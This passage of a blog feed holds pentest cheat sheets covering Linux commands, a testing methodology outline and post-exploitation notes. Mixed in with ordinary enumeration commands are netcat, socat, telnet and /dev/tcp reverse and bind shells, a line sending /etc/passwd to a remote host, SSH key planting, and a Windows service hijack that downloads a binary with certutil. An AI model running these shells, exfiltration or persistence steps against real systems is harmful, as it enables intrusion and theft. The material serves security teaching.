    - &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;porta &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filetextports&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vnz&lt;/span&gt; ip &lt;span class=&quot;nv&quot;&gt;$porta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Sacn in a range&lt;/span&gt;
- honeypot
    - &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 21 &amp;lt; 21.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; 21.log 2&amp;gt;&amp;gt; 21.log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# SHow a false banner, capture and save the commands and errors&lt;/span&gt;
Reverse shell 
- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
- nc.exe vn ip port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe 
Bind shell
- nc &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 
- nc.exe &lt;span class=&quot;nt&quot;&gt;-vn&lt;/span&gt; ip port &lt;span class=&quot;c&quot;&gt;# Victim - Open the port and receive shell&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ncat&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Use cryptography&lt;/span&gt;
- openssl req &lt;span class=&quot;nt&quot;&gt;-x509&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newkey&lt;/span&gt; rsa#2048 &lt;span class=&quot;nt&quot;&gt;-keyout&lt;/span&gt; chave.pem &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; cert.pem &lt;span class=&quot;nt&quot;&gt;-days&lt;/span&gt; 10 &lt;span class=&quot;c&quot;&gt;# Create a key to comunicate&lt;/span&gt;
- ncat &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 8443 —ssl-key chave.pem —ssl-cert cert.pem &lt;span class=&quot;c&quot;&gt;# Open the ssl port&lt;/span&gt;
- ncat &lt;span class=&quot;nt&quot;&gt;-vn&lt;/span&gt; 192.168.0.200 8443 —ssl &lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
- ncat &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 &lt;span class=&quot;c&quot;&gt;# Attack&lt;/span&gt;
Socat
- socat - tcp4-listen#2222 &lt;span class=&quot;c&quot;&gt;# Open port&lt;/span&gt;
- socat - tcp4:19.168.0.200:4040 &lt;span class=&quot;c&quot;&gt;# Connect to ip port&lt;/span&gt;
- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash &lt;span class=&quot;c&quot;&gt;# Send bash&lt;/span&gt;
Telnet
- telnet google.com 21 &lt;span class=&quot;c&quot;&gt;#  Connect to port&lt;/span&gt;
- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 &lt;span class=&quot;c&quot;&gt;# Shell reverse, send bash to 4444, and bash output to 4445&lt;/span&gt;
/dev/tcp
- &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/192.168.0.4/4545 &lt;span class=&quot;c&quot;&gt;# Open a tcp socket&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/192.168.0.4/4545 
- &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/192.168.0.4/4545 &lt;span class=&quot;c&quot;&gt;# Connect to a machine&lt;/span&gt;
- bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/192.168.0.4/4545 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1 &lt;span class=&quot;c&quot;&gt;# Send a bash to attackin machine/Reverse shell&lt;/span&gt;
Tor &lt;span class=&quot;c&quot;&gt;# service start tor&lt;/span&gt;
- proxychains# /etc/proxychains.conf
    - socks5 127.0.0.1 9050
    - dynamic_chain
    - Navegador &lt;span class=&quot;c&quot;&gt;# Manual proxy 127.0.0.1 9050, check proxy dns&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;services&quot;&gt;Services&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;update-rc.d service &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Save a service to boot  &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;localizar--output&quot;&gt;Localizar / Output&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate fileexample &lt;span class=&quot;c&quot;&gt;# Locate a file&lt;/span&gt;
updatedb &lt;span class=&quot;c&quot;&gt;# Update locate database&lt;/span&gt;
whereis programexample &lt;span class=&quot;c&quot;&gt;# Locate programs&lt;/span&gt;
which programexample &lt;span class=&quot;c&quot;&gt;# Locate binaries&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bin/bash&quot;&lt;/span&gt; /etc/passwd &lt;span class=&quot;c&quot;&gt;# Search by a specifi line&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bin/bash&quot;&lt;/span&gt; /etc/passw &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exemple 
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nologin&quot;&lt;/span&gt; /etc/passw &lt;span class=&quot;c&quot;&gt;# Exclude the specific lines&lt;/span&gt;
egrep &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nologin | /bin/false&quot;&lt;/span&gt; /etc/passw 
&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &apos;{print $1,$3}&apos; /etc/passwd # Show based in a filter&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f1&lt;/span&gt;,f2 &lt;span class=&quot;c&quot;&gt;# Cut and show a specific&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/wrong/right&apos;&lt;/span&gt; filelocal &lt;span class=&quot;c&quot;&gt;# Replace ocurrencies in a file&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Adjust the ouitput&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Delete all repeated occurencies(do sort before)&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count lines&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;privilege-escalation-commands&quot;&gt;Privilege escalation commands&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Count the lines&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;  /etc/passwd &lt;span class=&quot;c&quot;&gt;# Users&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Mchine name&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Kernel version x86/x64&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue &lt;span class=&quot;c&quot;&gt;# SO version&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-release&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# More complete SO informations&lt;/span&gt;
- dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List programs and verions&lt;/span&gt;
- ifconfig &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Network and adpters&lt;/span&gt;
- route &lt;span class=&quot;c&quot;&gt;# Route table and gateway&lt;/span&gt;
- netstat &lt;span class=&quot;nt&quot;&gt;-nlpt&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Open ports&lt;/span&gt;
- netstat &lt;span class=&quot;nt&quot;&gt;-nlpu&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# UDP open ports&lt;/span&gt;
- ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Show running proccess&lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab &lt;span class=&quot;c&quot;&gt;# Show as scripts and commands schedule&lt;/span&gt;
- find / &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Show directories with write permission&lt;/span&gt;
- find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Show programs that are executable &lt;/span&gt;
- &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# With sudo permissions&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="os" /><category term="linux" /><summary type="html">This is a guide for linux</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentest process</title><link href="http://localhost:4000/cheatsheet/2022/01/13/pentest.html" rel="alternate" type="text/html" title="Pentest process" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/pentest</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/pentest.html">&lt;p&gt;Pentest is a process that has various steps, and require attention at all attack vectors. So methodologies were created to establish a standard, these are the main methodologies:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.pentest-standard.org/index.php/Main_Page&quot;&gt;PTES - The Penetration Testing Execution Standard&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#owasp-testing-guides&quot;&gt;OWASP- The Open Web Application Security Project&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.nist.gov/cyberframework/framework&quot;&gt;NIST - National Institute of Standards and Technology&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.isecom.org/OSSTMM.3.pdf&quot;&gt;OSSTMM- - The Open Source Security Testing Methodology Manual&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Above is described a pentest flow.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Information Gathering -&amp;gt; &lt;a href=&quot;/osint&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Scanning -&amp;gt; &lt;a href=&quot;/scanning&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Enumeration -&amp;gt; &lt;a href=&quot;/enumeration&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Web hacking -&amp;gt; &lt;a href=&quot;/web-pentesting&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Exploitation -&amp;gt; &lt;a href=&quot;/exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Post-exploration -&amp;gt; &lt;a href=&quot;/post-exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Report&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Operational systems -&amp;gt; &lt;a href=&quot;/os&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Theses steps will be explained.&lt;/p&gt;
&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/osint&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Information Gathering - Business&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Search employees&lt;/li&gt;
      &lt;li&gt;Search Job offers&lt;/li&gt;
      &lt;li&gt;Search email address&lt;/li&gt;
      &lt;li&gt;Search users patterns&lt;/li&gt;
      &lt;li&gt;Search leaks&lt;/li&gt;
      &lt;li&gt;Search data in deepweb/Pastebin/Trello&lt;/li&gt;
      &lt;li&gt;Wayback machine&lt;/li&gt;
      &lt;li&gt;Google/Bing/Duckduckgo dorks hacking&lt;/li&gt;
      &lt;li&gt;Non Delivery Notification&lt;/li&gt;
      &lt;li&gt;Search by metadata in files&lt;/li&gt;
      &lt;li&gt;Write down any important information&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;scanning&quot;&gt;Scanning&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/scanning&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;reconnaissance&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Search IP ranges&lt;/li&gt;
      &lt;li&gt;Search BGP/ASN&lt;/li&gt;
      &lt;li&gt;Search Whois&lt;/li&gt;
      &lt;li&gt;Search RDAP&lt;/li&gt;
      &lt;li&gt;Search Shodan/Censys&lt;/li&gt;
      &lt;li&gt;Search em crt.sh&lt;/li&gt;
      &lt;li&gt;Search direct/reverse DNS&lt;/li&gt;
      &lt;li&gt;Search DNS zone transfer&lt;/li&gt;
      &lt;li&gt;Passive search
        &lt;ul&gt;
          &lt;li&gt;virustotal&lt;/li&gt;
          &lt;li&gt;dnsdumpster&lt;/li&gt;
          &lt;li&gt;securitytrails&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Traceroute&lt;/li&gt;
      &lt;li&gt;Active hosts&lt;/li&gt;
      &lt;li&gt;Open TCP ports&lt;/li&gt;
      &lt;li&gt;Open UDP ports&lt;/li&gt;
      &lt;li&gt;Services running in active ports&lt;/li&gt;
      &lt;li&gt;OS fingerprint&lt;/li&gt;
      &lt;li&gt;Identify possible defenses&lt;/li&gt;
      &lt;li&gt;Search SPF&lt;/li&gt;
      &lt;li&gt;Subdomains&lt;/li&gt;
      &lt;li&gt;Search by subdomain takeover&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/enumeration&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Ambient analysis&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Robots.txt/sitemap.xml&lt;/li&gt;
      &lt;li&gt;Brute force Directory/Pages/Files&lt;/li&gt;
      &lt;li&gt;Mirror website/Code analisys&lt;/li&gt;
      &lt;li&gt;Webserver/Accepted methods&lt;/li&gt;
      &lt;li&gt;WAF&lt;/li&gt;
      &lt;li&gt;SMB&lt;/li&gt;
      &lt;li&gt;RPC&lt;/li&gt;
      &lt;li&gt;SNMP&lt;/li&gt;
      &lt;li&gt;NFS&lt;/li&gt;
      &lt;li&gt;Indentify parameters&lt;/li&gt;
      &lt;li&gt;Bad configurations&lt;/li&gt;
      &lt;li&gt;Sensible data/default credentials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;web-hacking&quot;&gt;Web hacking&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/web-pentesting&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SQL Injection.&lt;/li&gt;
  &lt;li&gt;XXE&lt;/li&gt;
  &lt;li&gt;Broken access control&lt;/li&gt;
  &lt;li&gt;XSS&lt;/li&gt;
  &lt;li&gt;Command Injection&lt;/li&gt;
  &lt;li&gt;LFI&lt;/li&gt;
  &lt;li&gt;RFI&lt;/li&gt;
  &lt;li&gt;IDOR&lt;/li&gt;
  &lt;li&gt;SSRF&lt;/li&gt;
  &lt;li&gt;CSRF&lt;/li&gt;
  &lt;li&gt;Inputs&lt;/li&gt;
  &lt;li&gt;Template injection&lt;/li&gt;
  &lt;li&gt;Subdomain Takeover&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Buffer Overflow&lt;/li&gt;
  &lt;li&gt;Public Exploits&lt;/li&gt;
  &lt;li&gt;Reverse shell&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;post-exploration&quot;&gt;Post-exploration&lt;/h1&gt;
&lt;p&gt;-&amp;gt; &lt;a href=&quot;/post-exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration&lt;/li&gt;
  &lt;li&gt;Privile escalation&lt;/li&gt;
  &lt;li&gt;Pivoting&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;report&quot;&gt;Report&lt;/h1&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="methodologies" /><summary type="html">This is a guide to the process path of pentest.</summary></entry><entry><title type="html">Post exploitation</title><link href="http://localhost:4000/guide/2022/01/13/post-exploitation.html" rel="alternate" type="text/html" title="Post exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/post-exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/post-exploitation.html">&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h1&gt;

&lt;h3 id=&quot;ssh&quot;&gt;SSH&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; user &lt;span class=&quot;c&quot;&gt;# Attack&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;home/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;~www-data/
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; ~/.ssh/
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; ~/.ssh/authorized_keys
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;public_key&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/.ssh/authorized_keys
ssh www-data@172.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;windows&quot;&gt;Windows&lt;/h2&gt;
&lt;h3 id=&quot;automatized&quot;&gt;Automatized&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat&quot;&gt;winPEAS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;mandatory-level&quot;&gt;Mandatory level&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;whoami /groups&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;services&quot;&gt;Services&lt;/h3&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# List services&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Sate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PathName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Running&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Running services&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Informations about a service &lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;qc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Service configurations&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;binPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;certutil -urlcache -f priv.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Change the path of the file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;linux&quot;&gt;Linux&lt;/h2&gt;
&lt;h3 id=&quot;automatized-1&quot;&gt;Automatized&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&quot;&gt;linPEAS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;gtfobins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;linux-exploit-suggester&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;suidgetuid&quot;&gt;SUID/GETUID&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print&lt;/span&gt; 2&amp;gt;/dev/null 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;permissions&quot;&gt;Permissions&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Programs that run as sudo&lt;/span&gt;

